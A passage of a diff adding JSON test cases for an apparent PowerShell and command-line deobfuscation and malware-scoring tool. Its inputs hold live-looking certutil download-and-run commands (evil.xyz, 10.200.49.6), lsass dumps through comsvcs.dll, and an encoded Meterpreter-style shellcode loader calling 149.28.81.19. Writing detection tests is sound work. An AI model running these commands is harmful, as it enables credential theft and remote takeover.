cZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYjZ4XDEzeFwyM3hcOTV4XA==",
+    "input_len": 1130,
+    "engine": "archetype:PS_EncodedCommand+PS_HEXFAMILY_UNIFIED_OBFUSCATION+CERTUTIL_DOWNLOAD_DECODE_WORKFLOW",
+    "chain": [
+      "extract-b64",
+      "utf16le-or-utf8-decode",
+      "hexfamily-detect",
+      "hexfamily-unmap",
+      "hex-decode",
+      "base64-decode",
+      "utf16le-or-utf8-decode",
+      "certutil-annotate"
+    ],
+    "score": 100,
+    "verdict": "Malicious",
+    "mitre": [
+      "T1059.001",
+      "T1027.010",
+      "T1059.003",
+      "T1105",
+      "T1027"
+    ],
+    "lolbins": [
+      "certutil.exe",
+      "powershell.exe",
+      "cmd.exe"
+    ],
+    "iocs": {
+      "urls": [
+        "http://evil.xyz+X["
+      ],
+      "ips": [],
+      "domains": [
+        "evil.xyz",
+        "evil.xyz+x["
+      ],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "output": "# --- Certutil LOLBAS Workflow Detected ---\n# T1105 \u00b7 Ingress Tool Transfer (certutil -urlcache)\ncmd.exe /c \"certutil.exe -urlcache -split -f http://evil.xyz+X[\u001d\ufffd\\\ufffdK\ufffd^\u0019IL\ufffd\tL\ufffdU\u0011ST\tL\ufffdIMP\ufffdX[\u001d\ufffd\\\ufffdK\ufffd^\u0019IL\ufffd\tL\ufffd\ufffdL\ufffd\ufffdL\ufffd\tL\ufffdU\u0011ST\tL\ufffdIMP\ufffdX[\u001d\ufffd\\\ufffdK\ufffd^\u0019IL",
+    "post_proc": {}
+  },
+  {
+    "name": "Real_Confirmed_Authorized Activity",
+    "input": "urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw C:\\Users\\SP_APP~1\\AppData\\Local\\Temp\\BfBjkkJBdU.exe, /c certutil -urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw %TEMP%\\BfBjkkJBdU.exe & start /B %TEMP%\\BfBjkkJBdU.exe, certutil -urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw %TEMP%\\BfBjkkJBdU.exe & start /B %TEMP%\\BfBjkkJBdU.exe",
+    "input_len": 363,
+    "engine": "archetype:CERTUTIL_DOWNLOAD_DECODE_WORKFLOW+smart",
+    "chain": [
+      "certutil-annotate",
+      "env-expand"
+    ],
+    "score": 82,
+    "verdict": "Malicious",
+    "mitre": [
+      "T1105",
+      "T1059.003",
+      "T1074.001"
+    ],
+    "lolbins": [
+      "certutil.exe"
+    ],
+    "iocs": {
+      "urls": [
+        "http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw"
+      ],
+      "ips": [
+        "10.200.49.6"
+      ],
+      "domains": [],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "output": "# --- Certutil LOLBAS Workflow Detected ---\n# T1105 \u00b7 Ingress Tool Transfer (certutil -urlcache)\nurlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw C:\\Users\\SP_APP~1\\AppData\\Local\\Temp\\BfBjkkJBdU.exe, /c certutil -urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw C:\\Users\\Public\\AppData\\Local\\Temp\\BfBjkkJBdU.exe & start /B C:\\Users\\Public\\AppData\\Local\\Temp\\BfBjkkJBdU.exe, certutil -urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw C:\\Users\\Public\\AppData\\Local\\Temp\\BfBjkkJBdU.exe & start /B C:\\Users\\Public\\AppData\\Local\\Temp\\BfBjkkJBdU.exe",
+    "post_proc": {}
+  },
+  {
+    "name": "Investigate",
+    "input": "cmd.exe /q /c powershell.exe -e ZDN4XGQzeFw3NnhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcZTR4XDU1eFxlNHhcYzZ4XDU1eFxhNnhcZDR4XGM2eFwxNHhcNjV4XDQ1eFw2NHhcMjV4XDY1eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcOTZ4XGU0eFw5N3hcNTV4XDk2eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcZTR4XDU1eFxlNHhcYzZ4XDU1eFxhNnhcZDR4XGM2eFwxNHhcNjV4XDQ1eFw2NHhcMjV4XDY1eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcOTM4XDk2eFw1NnhcNTN4XDg2eFxlNnhcYzR4XDM3eFxjNnhcZDZ4XDQ2eFxjNnhcOTN4XDk3eFxjNHhcMjR4XGU0eFw0NXhcYTR4XDc3eFwyNXhcODR4XDQ2eFxmNnhcMjR4XGE2eFxkNHhcYzZ4XDk1eFw3NXhcYzR4XDc3eFw5NHhcNDV4XGE0eFwwM3hcYzZ4XDc0eFwyNnhcNzd4XGU0eFw4NXhcYzR4XDc3eFw5NHhcNDV4XGE0eFxjNnhcODZ4XDIzeFw5NXhcODZ4XGU0eFw3NHhcMjZ4XDk3eFw2NXhcODV4XGM0eFw3N3hcOTR4XDQ1eFxhNHhcYzZ4XDg2eFw4NXhcYTV4XDU3eFw3N3hcNzV4XDE2eFwwM3hcNjV4XDg0eFw0NnhcOTd4XDY1eFwyM3hcOTV4XDk3eFw5NHhcNDV4XGE0eFw3N3hcOTR4XDQ1eFxhNHhcYTZ4XDkzeFwzNHhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0N3hcNjR4XGQ2eFw0NXhcNzd4XDk0eFw0NXhcYTR4XDAzeFxlNHhcNzV4XGE1eFwxN3hcYTR4XDIzeFw0NXhcNDd4XDE1eFwzM3hcOTV4XGM2eFw4N3hcNzV4XGE1eFw0NXhcMjR4XGE2eFxkNHhcYzZ4XGQ0eFwwM3hcZTR4XGM2eFwxNHhcYTZ4XGQ0eFxjNnhcZDR4XDMzeFw3NnhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYjZ4XDEzeFwyM3hcOTV4XA==",
+    "input_len": 1384,
+    "engine": "archetype:PS_EncodedCommand+PS_HEXFAMILY_UNIFIED_OBFUSCATION",
+    "chain": [
+      "extract-b64",
+      "utf16le-or-utf8-decode",
+      "hexfamily-detect",
+      "hexfamily-unmap",
+      "hex-decode",
+      "base64-decode",
+      "utf16le-or-utf8-decode"
+    ],
+    "score": 100,
+    "verdict": "Suspicious",
+    "mitre": [
+      "T1059.001",
+      "T1027.010",
+      "T1059.003",
+      "T1027"
+    ],
+    "lolbins": [
+      "powershell.exe",
+      "cmd.exe"
+    ],
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "domains": [],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "output": "==gMyUSZ4VmLlJXY3xWYtNUNlUjMlAVTFRVNyUCMyUiNyUiNyUCMyUSZ4VmLlJXY3xWYtNUNlUjMlAVTFRVNyUCMyUSZ4VmLlJXY3xWYtie5hnLslmdl9yLBNTJwRHdoBjMlYWLwITJ0lGbwNXLwITJlh2YhNGbyVXLwITJlhXZuwWa0VHdyV2YyITJwITJj9CMyUSZtFmTwITJ0NWZqJ2TtQ3YlxWZTBjMlM0NlAjMlM3gMyUSZ4VmLk12Y",
+    "post_proc": {}
+  },
+  {
+    "name": "Error3",
+    "input": "powershell.exe -e ZDN4XDk0eFxhNnhcZDR4XGM2eFw5NXhcMzV4XDM2eFxhNnhcNTN4XDk3eFwzNnhcYTZ4XDkzeFxkNnhcMzZ4XDc3eFxlNHhcNTV4XGU0eFxjNHhcMTR4XDY1eFw0NXhcNjR4XDI1eFw2NXhcMTV4XGE3eFw1NXhcOTZ4XDQ2eFw1N3hcNjV4XDc0eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcOTZ4XDQ2eFxhY3hcZTR4XDU1eFxjNHhcMDN4XGE0eFwzM3hcMjZ4XDc3eFw4NnhcODV4XDI1eFw3N3hcOTR4XDQ1eFxhNHhcNDR4XDQ2eFw0NXhcYTR4XDc3eFw5NHhcNDV4XGE0eFxiNnhcYzZ4XDU0eFxkNHhcOTd4XDU1eFw5N3hcMTV4XDk3eFw1NXhcMzV4XGE1eFw0N3hcNjR4XGQ2eFw0NXhcNzd4XDk0eFw0NXhcYTR4XDAzeFxlNHhcNzV4XGE1eFwxN3hcYTR4XDIzeFw0NXhcNDd4XDE1eFwzM3hcOTV4XGM2eFw4N3hcNzV4XGE1eFw0NXhcMjR4XGE2eFxkNHhcYzZ4XGQ0eFwwM3hcZTR4XGM2eFwxNHhcYTZ4XGQ0eFxjNnhcZDR4XDMzeFwzNnhcYzZ4XGU0eFwyM3hcMjZ4XDk3eFwyNHhcNjV4XGM0eFwwM3hcNjV4XDIzeFwyNXhcOTd4XDk0eFw0NXhcYTR4XDc3eFw5NHhcNDV4XGE0eFxhNnhcMTN4XDM0eFxkNHhcOTd4XDU1eFw5N3hcMzZ4XGE3eFw2NHhcNzR4XDM2eFw1M3hcYTR4XDc0eFxkNHhcOTd4XDU1eFwzNHhcMzZ4XGM2eFwxM3hcMzR4XGQ0eFw5N3hcNTV4XDM0eFwyNnhcMzd4XDY1eFw3NHhcMTZ4XGE3eFxhNHhcODV4XGE1eFwzM3hcOTN4XDc0eFwzNnhc",
+    "input_len": 978,
+    "engine": "archetype:PS_EncodedCommand+PS_HEXFAMILY_UNIFIED_OBFUSCATION",
+    "chain": [
+      "extract-b64",
+      "utf16le-or-utf8-decode",
+      "hexfamily-detect",
+      "hexfamily-unmap",
+      "hex-decode",
+      "base64-decode",
+      "utf16le-or-utf8-decode"
+    ],
+    "score": 100,
+    "verdict": "Suspicious",
+    "mitre": [
+      "T1059.001",
+      "T1027.010",
+      "T1057",
+      "T1027"
+    ],
+    "lolbins": [
+      "powershell.exe"
+    ],
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "domains": [],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "output": "powershell -ep bypass -c \"Get-Process | Select-Object Name, Id | Export-C]\ufffdL\ufffd\tL\ufffd\u0019[\ufffd\ufffdL\ufffdU\u0011ST\u0002\ufffdP\ufffd\u001c\ufffd\ufffd\ufffd\u02d8\ufffdI\ufffdL",
+    "post_proc": {}
+  },
+  {
+    "name": "Error2",
+    "input": "powershell.exe -e XGs1OVxrNnFcazQ2XGs3blxrNjFcazQzXGs1NVxrNzlcazRxXGs0M1xrMzFcazcwXGs0blxrNTRcazQ5XGs3N1xrNG5cazU0XGs0clxrNDZcazRuXGs1NFxrNDlcazMyXGs0blxrNTRcazQ5XGs3N1xrNHBcazMyXGs1MlxrNnBcazY0XGs2OVxrMzlcazMwXGs1OVxrMzNcazQxXGs3NlxrNHFcazU0XGs0MVxrNzVcazRxXGs1NFxrNDFcazc1XGs0cVxrNTRcazQxXGs3NVxrNHFcazU0XGs0MVxrNzYcazRyXGs0NFxrNTFcazMwXGs0clxrNDNcazU1XGs3OVxrNHFcazQ0XGs0MVxrNnBcazRxXGszMFxrNTVcazZwXGs0cVxrNm5cazU5XGs3OA==",
+    "input_len": 426,
+    "engine": "archetype:PS_EncodedCommand+PS_HEXFAMILY_UNIFIED_OBFUSCATION+BLIND_XOR_SINGLE_BYTE",
+    "chain": [
+      "extract-b64",
+      "utf16le-or-utf8-decode",
+      "hexfamily-detect",
+      "hexfamily-unmap",
+      "hex-decode",
+      "base64-decode",
+      "utf16le-or-utf8-decode",
+      "hex-or-b64-decode",
+      "xor-bruteforce-256"
+    ],
+    "score": 100,
+    "verdict": "Suspicious",
+    "mitre": [
+      "T1059.001",
+      "T1027.010",
+      "T1027"
+    ],
+    "lolbins": [
+      "powershell.exe"
+    ],
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "domains": [],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [
+        "2211332865726c6d296572706573456572766572706b2424366f3423306f6d70"
+      ],
+      "bitcoin_addresses": []
+    },
+    "output": "\u2500\u2500\u2500\u2500 BLIND_XOR_SINGLE_BYTE (v1.2.0) \u2500\u2500\u2500\u2500\nInput encoding : base64\nRaw bytes      : 55\nXOR key found  : 0x40  (score 1.24 \u00b7 baseline 0.84)\nFirst 32 bytes : 2211332865726c6d296572706573456572766572706b2424366f3423306f6d70\nDecoded (ASCII):\n\"\u00113(erlm)erpesEerverpk$$6o4#0ompnmpnmpnmpLMMLI\f\ufffdLIK\ufffd\tK\ufffd",
+    "post_proc": {}
+  },
+  {
+    "name": "Need_Evaluation on OUTPUT",
+    "input": "[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0SdxwdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDGZ5dEUjSEwodIgEoJKXg6X5qzPHl1iO1buG+VuC6rtpnoH41qg2+GNzdpA2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1PmpWeplO0fErSN2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDFQ0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6YYoEWg5NP6S9kDRy7v1+9l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwNNWBtXdWBhJ7ISLKZq6AwYNoC+D0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHbyNyxgW2LAdGXKMGjAwRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlkoRz/PZlPTWZ+1fLS6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzIyNLIyNjI3RLe4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41bGe+DLqt7c3BIXGg0RGw0bEg0SGiMjIyMg')",
+    "input_len": 1170,
+    "engine": "magic",
+    "chain": [
+      "extract-payload",
+      "base64-decode",
+      "xor-brute"
+    ],
+    "score": 98,
+    "verdict": "Suspicious",
+    "mitre": [
+      "T1140",
+      "T1027",
+      "T1055",
+      "T1620"
+    ],
+    "lolbins": [],
+    "iocs": {
+      "urls": [],
+      "ips": [
+        "149.28.81.19"
+      ],
+      "domains": [],
+      "emails": [
+        "...@x..tJ"
+      ],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "output": "# \u2500\u2500\u2500 Shellcode Detected: Metasploit Meterpreter (reverse_tcp/https \u00b7 x86 stager) \u2500\u2500\u2500\n# Arch    : x86_64 \u00b7 Size: 833B \u00b7 Entropy: 7.151\n# MITRE   : T1071.001\n# UA      : User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;PTBR)\n# IPs     : 149.28.81.19\n#\n# Hex dump (first 128 bytes):\n  00000000  fc e8 89 00 00 00 60 89 e5 31 d2 64 8b 52 30 8b   |......`..1.d.R0.|\n  00000010  52 0c 8b 52 14 8b 72 28 0f b7 4a 26 31 ff 31 c0   |R..R..r(..J&1.1.|\n  00000020  ac 3c 61 7c 02 2c 20 c1 cf 0d 01 c7 e2 f0 52 57   |.<a|., .......RW|\n  00000030  8b 52 10 8b 42 3c 01 d0 8b 40 78 85 c0 74 4a 01   |.R..B<...@x..tJ.|\n  00000040  d0 50 8b 48 18 8b 58 20 01 d3 e3 3c 49 8b 34 8b   |.P.H..X ...<I.4.|\n  00000050  01 d6 31 ff 31 c0 ac c1 cf 0d 01 c7 38 e0 75 f4   |..1.1.......8.u.|\n  00000060  03 7d f8 3b 7d 24 75 e2 58 8b 58 24 01 d3 66 8b   |.}.;}$u.X.X$..f.|\n  00000070  0c 4b 8b 58 1c 01 d3 8b 04 8b 01 d0 89 44 24 24   |.K.X.........D$$|\n  \u2026 (705 more bytes truncated)\n#\n# Recommendation: extract raw bytes \u2192 run through `speakeasy` or `scdbg` for full behavioural analysis. If Meterpreter/Cobalt Strike, extract the C2 config with `1768` or `dissect.cobaltstrike`.",
+    "post_proc": {}
+  },
+  {
+    "name": "GoodOne",
+    "input": " [\n        \"-Embedding\",\n        \"-NoP -Enc cgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAYwBvAG0AcwB2AGMAcwAuAGQAbABsACwAIABgACMAKwAwADAAMAAwADIANAAgACgARwBlAHQALQBQAHIAbwBjAGUAcwBzACAAbABzAGEAcwBzACkALgBJAGQAIABcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANQBQAFkATgAuAG8AZAB0ACAAZgB1AGwAbAA=\",\n        \"-NoP -Enc cgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAYwBvAG0AcwB2AGMAcwAuAGQAbABsACwAIABgACMAKwAwADAAMAAwADIANAAgACgARwBlAHQALQBQAHIAbwBjAGUAcwBzACAAbABzAGEAcwBzACkALgBJAGQAIABcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAdABuAGUAZABOAC4AZABvAGMAIABmAHUAbABsAA==\",\n        \"-NoP -Enc cgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAYwBvAG0AcwB2AGMAcwAuAGQAbABsACwAIABgACMAKwAwADAAMAAwADIANAAgACgARwBlAHQALQBQAHIAbwBjAGUAcwBzACAAbABzAGEAcwBzACkALgBJAGQAIABcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAdwBhAE8AbwB3AE8AWgAuAHIAYwB0ACAAZgB1AGwAbAA=\",\n        \"/Q /c for /f \\\\\\\"tokens=1,2 delims= \\\\\\\" %A in ('\\\\\\\"tasklist /fi \\\\\\\"Imagename eq lsass.exe\\\\\\\" | find \\\\\\\"lsass\\\\\\\"\\\\\\\"') do rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, #+000024 %B \\\\Windows\\\\Temp\\\\m6Mh6.ttf full\",\n        \"C:\\\\windows\\\\System32\\\\comsvcs.dll, #+000024 1076 \\\\Windows\\\\Temp\\\\m6Mh6.ttf full\",\n        \"CMD.exe /Q /c for /f \\\\\\\"tokens=1,2 delims= \\\\\\\" ^%A in ('\\\\\\\"tasklist /fi \\\\\\\"Imagename eq lsass.exe\\\\\\\" | find \\\\\\\"lsass\\\\\\\"\\\\\\\"') do rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, #+0000^24 ^%B \\\\Windows\\\\Temp\\\\waOowOZ.rct full\",\n        \"CmD.EXE /Q /c for /f \\\\\\\"tokens=1,2 delims= \\\\\\\" ^%A in ('\\\\\\\"tasklist /fi \\\\\\\"Imagename eq lsass.exe\\\\\\\" | find \\\\\\\"lsass\\\\\\\"\\\\\\\"') do rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, #+0000^24 ^%B \\\\Windows\\\\Temp\\\\tnedN.doc full\",\n        \"cMd.ExE /Q /c for /f \\\\\\\"tokens=1,2 delims= \\\\\\\" ^%A in ('\\\\\\\"tasklist /fi \\\\\\\"Imagename eq lsass.exe\\\\\\\" | find \\\\\\\"lsass\\\\\\\"\\\\\\\"') do rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, #+0000^24 ^%B \\\\Windows\\\\Temp\\\\uw9.rtf full\"\n    ],",
+    "input_len": 2010,
+    "engine": "magic",
+    "chain": [
+      "extract-payload",
+      "base64-decode",
+      "utf16le-decode"
+    ],
+    "score": 71,
+    "verdict": "Suspicious",
+    "mitre": [
+      "T1003.001",
+      "T1218.011",
+      "T1059.001",
+      "T1057",
+      "T1021.002",
+      "T1027.010",
+      "T1059.003",
+      "T1027",
+      "T1074.001"
+    ],
+    "lolbins": [
+      "rundll32.exe",
+      "cmd.exe",
+      "Comsvcs.dll"
+    ],
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "domains": [],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "output": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, `#+000024 (Get-Process lsass).Id \\Windows\\Temp\\waOowOZ.rct full",
+    "post_proc": {}
+  },
+  {
+    "name": "Case2",
+    "input": "C:\\temp\\temp\\1.exe C:\\temp\\temp\\2.dll\nC:\\WINDOWS\\system32\\cmd.exe /C C:\\temp\\temp\\1.exe C:\\temp\\temp\\2.dll\n\nTDdmZZQkkW0vnh3fyzO66xnGPtBx1zpJkklIcmY9nwuHiyTwFOJ/PnSX0sGSltQbjiY/Qt+DDxngJZwi5TybUPFGaXkIbRdyJw9lSfID0NoefHw9C/JAirGhJnor0RY1bjL5HMpe3AJo/ym+mMPhlQ0DlC0L8lRfEHFlD1jYkSUja+8qjGId/zeN6J5gXLIYPvHm/Kk2quUcUAHC9ZIUpxJk+OkKWstSv3t4YOJtp5lMI6raWpN5GB0EbicU4pT62syHxZaD\n\npowershell.exe -NonInteractive -enc JAB0AGEAcwBrAFAAYQB0AGgAIAA9ACAAIgBcACIACgAkAGUAbgBjAHIAeQBwAHQAaQBvAG4ASwBlAHkAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIAZwBNAGUAKwB1AGEAUAB1AFkAZABtAEgAOABtAFAASgAwAFMAYgBvAEYAQQA9AD0AIgApAAoAZgB1AG4AYwB0AGkAbwBuACAAQwBvAG4AdgBlAHIAdABUAG8ALQBCAGEAcwBlADYANAAoACQAYgB5AHQAZQBBAHIAcgBhAHkAKQAgAHsACgAgACAAIAAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBBAHIAcgBhAHkAKQAKAH0ACgAKAGYAdQBuAGMAdABpAG8AbgAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEIAYQBzAGUANgA0ACgAJABiAGEAcwBlADYANABTAHQAcgBpAG4AZwApACAAewAKACAAIAAgACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAYgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKQAKAH0ACgAKAGYAdQBuAGMAdABpAG8AbgAgAEUAbgBjAHIAeQBwAHQALQBEAGEAdABhACgAJABrAGUAeQAsACAAJABkAGEAdABhACkAIAB7AAoAIAAgACAAIAAkAGEAZQBzAE0AYQBuAGEAZwBlAGQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBBAGUAcwBNAGEAbgBhAGcAZQBkAAoAIAAgACAAIAAkAGEAZQBzAE0AYQBuAGEAZwBlAGQALgBNAG8AZABlACAAPQAgAFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAEMAaQBwAGgAZQByAE0AbwBkAGUAXQA6ADoAQwBCAEMACgAgACAAIAAgACQAYQBlAHMATQBhAG4AYQBnAGUAZAAuAFAAYQBkAGQAaQBuAGcAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AUABhAGQAZABpAG4AZwBNAG8AZABlAF0AOgA6AFAASwBDAFMANwAKACAAIAAgACAAJABhAGUAcwBNAGEAbgBhAGcAZQBkAC4ASwBlAHkAIAA9ACAAJABrAGUAeQAKACAAIAAgACAAJABhAGUAcwBNAGEAbgBhAGcAZQBkAC4ARwBlAG4AZQByAGEAdABlAEkAVgAoACkACgAgACAAIAAgACQAZQBuAGMAcgB5AHAAdABvAHIAIAA9ACAAJABhAGUAcwBNAGEAbgBhAGcAZQBkAC4AQwByAGUAYQB0AGUARQBuAGMAcgB5AHAAdABvAHIAKAApAAoAIAAgACAAIAAkAHUAdABmADgAQgB5AHQAZQBzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGQAYQB0AGEAKQAKACAAIAAgACAAJABlAG4AYwByAHkAcAB0AGUAZABEAGEAdABhACAAPQAgACQAZQBuAGMAcgB5AHAAdABvAHIALgBUAHIAYQBuAHMAZgBvAHIAbQBGAGkAbgBhAGwAQgBsAG8AYwBrACgAJAB1AHQAZgA4AEIAeQB0AGUAcwAsACAAMAAsACAAJAB1AHQAZgA4AEIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkACgAgACAAIAAgACQAYwBvAG0AYgBpAG4AZQBkAEQAYQB0AGEAIAA9ACAAJABhAGUAcwBNAGEAbgBhAGcAZQBkAC4ASQBWACAAKwAgACQAZQBuAGMAcgB5AHAAdABlAGQARABhAHQAYQAKACAAIAAgACAAcgBlAHQAdQByAG4AIABDAG8AbgB2AGUAcgB0AFQAbwAtAEIAYQBzAGUANgA0ACAAJABjAG8AbQBiAGkAbgBlAGQARABhAHQAYQAKAH0ACgAKAGYAdQBuAGMAdABpAG8AbgAgAEQAZQBjAHIAeQBwAHQALQBEAGEAdABhACgAJABrAGUAeQAsACAAJABlAG4AYwByAHkAcAB0AGUAZABEAGEAdABhACkAIAB7AAoAIAAgACAAIAAkAGEAZQBzAE0AYQBuAGEAZwBlAGQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBBAGUAcwBNAGEAbgBhAGcAZQBkAAoAIAAgACAAIAAkAGEAZQBzAE0AYQBuAGEAZwBlAGQALgBNAG8AZABlACAAPQAgAFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAEMAaQBwAGgAZQByAE0AbwBkAGUAXQA6ADoAQwBCAEMACgAgACAAIAAgACQAYQBlAHMATQBhAG4AYQBnAGUAZAAuAFAAYQBkAGQAaQBuAGcAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AUABhAGQAZABpAG4AZwBNAG8AZABlAF0AOgA6AFAASwBDAFMANwAKACAAIAAgACAAJABjAG8AbQBiAGkAbgBlAGQARABhAHQAYQAgAD0AIABDAG8AbgB2AGUAcgB0AEYAcgBvAG0ALQBCAGEAcwBlADYANAAgACQAZQBuAGMAcgB5AHAAdABlAGQARABhAHQAYQAKACAAIAAgACAAJABhAGUAcwBNAGEAbgBhAGcAZQBkAC4ASQBWACAAPQAgACQAYwBvAG0AYgBpAG4AZQBkAEQAYQB0AGEAWwAwAC4ALgAxADUAXQAKACAAIAAgACAAJABhAGUAcwBNAGEAbgBhAGcAZQBkAC4ASwBlAHkAIAA9ACAAJABrAGUAeQAKACAAIAAgACAAJABkAGUAYwByAHkAcAB0AG8AcgAgAD0AIAAkAGEAZQBzAE0AYQBuAGEAZwBlAGQALgBDAHIAZQBhAHQAZQBEAGUAYwByAHkAcAB0AG8AcgAoACkACgAgACAAIAAgACQAZQBuAGMAcgB5AHAAdABlAGQARABhAHQAYQBCAHkAdABlAHMAIAA9ACAAJABjAG8AbQBiAGkAbgBlAGQARABhAHQAYQBbADEANgAuAC4AJABjAG8AbQBiAGkAbgBlAGQARABhAHQAYQAuAEwAZQBuAGcAdABoAF0ACgAgACAAIAAgACQAZABlAGMAcgB5AHAAdABlAGQARABhAHQAYQBCAHkAdABlAHMAIAA9ACAAJABkAGUAY\